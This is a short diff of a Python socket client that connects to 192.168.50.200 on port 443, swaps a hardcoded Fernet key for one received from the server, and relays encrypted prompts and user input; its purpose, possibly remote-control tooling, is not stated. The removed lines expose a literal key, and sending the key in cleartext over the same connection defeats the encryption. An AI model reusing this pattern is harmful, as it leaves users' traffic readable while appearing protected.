@@ -4,8 +4,7 @@ import time
 from cryptography.fernet import Fernet
 
 
-key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
-cipher = Fernet(key)
+
 
 def Encrypt(data):
     return cipher.encrypt(data)
@@ -31,6 +30,9 @@ print("""
 conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 conn.connect(('192.168.50.200',443))
+
+key = conn.recv(1024)
+cipher = Fernet(key)
 
 print(Decrypt(conn.recv(1024)).decode(), end="")
 conn.send(Encrypt(input().encode()))
